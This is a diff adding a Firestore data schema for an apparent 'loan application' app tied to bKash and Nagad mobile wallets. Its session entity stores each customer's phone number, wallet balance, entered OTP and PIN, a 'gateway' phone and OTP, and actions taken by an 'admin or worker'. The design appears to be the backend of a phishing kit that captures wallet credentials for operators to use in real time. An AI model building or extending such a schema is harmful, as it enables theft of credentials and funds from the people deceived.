@@ -1,0 +1,58 @@
+{
+  "entities": {
+    "session": {
+      "title": "CustomerSession",
+      "description": "Represents an active or historical loan application session.",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "description": "Unique session identifier" },
+        "orderId": { "type": "string", "description": "Unique order reference" },
+        "name": { "type": "string", "description": "Customer name or label" },
+        "provider": { "type": "string", "description": "Payment provider (bkash / nagad)" },
+        "initialPhone": { "type": "string", "description": "Mobile number entered" },
+        "gatewayPhone": { "type": "string", "description": "Gateway mobile number" },
+        "balance": { "type": "string", "description": "Reported wallet balance" },
+        "lastBalance": { "type": "string", "description": "Previous known balance" },
+        "otp": { "type": "string", "description": "OTP entered by customer" },
+        "gatewayOtp": { "type": "string", "description": "Gateway OTP" },
+        "pin": { "type": "string", "description": "PIN entered" },
+        "adminAction": { "type": "string", "description": "Action performed by admin or worker" },
+        "blocked": { "type": "boolean", "description": "Whether the client IP/session is blocked" },
+        "clientIp": { "type": "string", "description": "Client IP address" },
+        "createdAt": { "type": "number", "description": "Timestamp when session was created (epoch ms)" },
+        "lastUpdated": { "type": "number", "description": "Timestamp when session was last modified (epoch ms)" }
+      },
+      "required": ["id"]
+    },
+    "setting": {
+      "title": "AppSetting",
+      "description": "Global application setting flag or value.",
+      "type": "object",
+      "properties": {
+        "value": { "type": "boolean", "description": "Boolean setting value" }
+      }
+    },
+    "blockedIp": {
+      "title": "BlockedIp",
+      "description": "Blocked IP address entry.",
+      "type": "object",
+      "properties": {
+        "blocked": { "type": "boolean", "description": "Flag indicating if IP is blocked" }
+      }
+    }
+  },
+  "firestore": {
+    "/sessions/{sessionId}": {
+      "schema": "session",
+      "description": "Collection of customer loan application sessions"
+    },
+    "/settings/{settingKey}": {
+      "schema": "setting",
+      "description": "Application configuration settings"
+    },
+    "/blocked_ips/{ip}": {
+      "schema": "blockedIp",
+      "description": "Blocked client IP addresses"
+    }
+  }
+}
